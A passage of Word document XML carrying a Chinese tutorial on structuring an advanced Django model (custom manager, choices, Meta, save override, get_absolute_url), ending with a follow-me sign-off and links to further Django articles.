        <w:t xml:space="preserve">        # do other things. send_mail()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237F81B8" w14:textId="2C281059" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DA046FC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个完美的Django高级模型结构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D014E7" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个完美的django高级模型结构如下所示，可以满足绝大部分应用场景，希望对你有所帮助。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05AEEB77" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC356BC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import reverse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573AF321" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68EA4D58" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20BD9A3E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>自定义</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Manager</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C67B4FF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class HighRatingManager(models.Manager):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D029F78" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_queryset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3409C1E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return super().get_queryset().filter(rating='1')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219479C3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78658281" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35FA34E0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Product(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44DBA074" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # CHOICES</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>选项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086F1320" w14:textId="77777777" w:rsidR="00D8288D"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RATING_CHOICES = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56ED2055" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("1", 'Very good'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709A219C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("2", 'Good'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA23E9D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("3", 'Bad'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BF91B2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381B2CF6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EA6E3D9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # </w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>数据表字段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DBDD2B" w14:textId="77777777" w:rsidR="00D8288D"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name = models.CharField('name', max_length=30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D23F18C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">     rating = models.CharField(max_length=1, choices=RATING_CHOICES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51714B57" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59DD1ACE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # MANAGERS</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293DCADA" w14:textId="77777777" w:rsidR="00D8288D"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objects = models.Manager()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D85E948" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">     high_rating_products =HighRatingManager()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACA6647" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FE3B27C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # META</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>类选项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B36BDAB" w14:textId="77777777" w:rsidR="00D8288D"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class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB2637B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        verbose_name = 'product'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06EFAB5A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        verbose_name_plural = 'products'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8A9800" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05C96EC3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # __str__</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079BF960" w14:textId="77777777" w:rsidR="00D8288D"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def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602A913F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FECDE46" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E953822" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # </w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>重写</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>save</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E681E19" w14:textId="77777777" w:rsidR="00D8288D"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def save(self, *args, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1393991A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        do_something()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684E5DFC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        super().save(*args, **kwargs) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275243B8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        do_something_else()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2E81CE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="297E548B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # </w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>定义绝对路径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8BDCD7" w14:textId="77777777" w:rsidR="00D8288D"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def get_absolute_url(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA42A57" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return reverse('product_details', kwargs={'pk': self.id})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CDEEF6B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="153B046A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # </w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>定义其它方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BEB65D" w14:textId="6F93D40E" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def do_something(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1325E791" w14:textId="1618BE0B" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小编我写篇文章不易，欢迎转发点赞。下面我要去玩局王者荣耀犒劳下自己了。接下来我会写URL配置，视图，模板及表单的高级进阶，欢迎关注我的微信号, 决不让你失望。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29ADE5EE"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0" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(7): cookie和session应用场景及如何使用</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0F5A9708"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1" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(8): 缓存Cache应用场景及工作原理，Cache设置及如何使用</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2160D0E5"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2" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(9): 表单Forms的高级使用技巧</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1A3AA381"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3" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(10): URL重定向的HttpResponseDirect, redirect和reverse的用法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="569F5C2F"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4" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
